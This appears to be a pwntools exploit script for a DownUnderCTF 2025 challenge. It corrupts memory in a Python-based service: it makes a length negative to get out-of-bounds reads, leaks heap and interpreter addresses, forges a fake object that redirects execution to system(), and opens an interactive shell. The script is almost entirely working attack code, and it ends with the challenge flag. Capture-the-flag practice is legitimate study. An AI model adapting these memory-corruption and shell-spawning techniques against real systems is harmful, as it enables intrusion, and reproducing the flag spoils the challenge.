from pwn import *


context.terminal = ['tmux', 'splitw', '-h']  
context.log_level = "error"


# helpers
def read(idx):
    p.sendline(f"r {idx}")
def write(off,byte):
    p.sendlineafter(">",f"w {off} {byte}")
def writes(off,size,bytesss,wait=True):
    if type(bytesss) != bytes:
        bytesss = bytesss.to_bytes(size, 'little')
    for i, byte in enumerate(bytesss):
        if wait:
            p.sendlineafter(">",f"w {off + i} {byte}")
        else:
            p.sendline(f"w {off + i} {byte}")

p = remote("chal.2025-us.ductf.net", 30004)
# p = remote("localhost", 1337)


# make len negative and read a stable leak
writes(16,8,0xffffffffffffffff)
read(-40)
leak = p.recvline()
leak = int(leak.split(b"at")[1].split(b">")[0].strip(),16)
print("leak",hex(leak))


# leak is from the objs area in python (a fuzzer is saying this)
# so we can locate our obj and our str (defined in the array)
obj_addr = leak + 0x2f350
str_addr = obj_addr + 0xc2630
str_offset = str_addr - obj_addr 

# this helps me find the obj in gdb
writes(16,8,b"########")


# overwrite length and enjoy the leaks
writes(str_offset + 0x10,2,0xffff)
read(3)
p.recvuntil("> ")
leaks = []
for i in range(100):
    A = p.recv(8)
    leaks.append(u64(A))
    # print(A)
    # print(i,hex(leaks[-1]))
p.clean()


# py_base and system_plt
py_base = leaks[5] - 0x11b00 
print("py_base",hex(py_base))
system_plt = py_base - 0x4f3ba0
print("system_plt",hex(system_plt))

# create our fake 
# it doesnt matter what i put in it
# it will crash and rip=0x11
# so i overwrote that with system plt

fake_obj = 0x3000
fake_obj_addr = obj_addr + fake_obj
print("obj_addr",hex(obj_addr))
print("str_addr",hex(str_addr))
for i  in range(20):
    writes(fake_obj + 8 * i,8,i,False)

writes(fake_obj + 8 * 0x11,8,system_plt)
# fun fact, "aash" bc ref counter increments
writes(str_offset,8,u64(b"aash".ljust(8,b"\x00")))
writes(str_offset + 8,8,fake_obj_addr)
read(3)

p.clean()
# enjoy the shell
p.sendline("id")

p.interactive()

# DUCTF{see_python_exploitation_can_be_fun_if_memory_corruption_is_involved}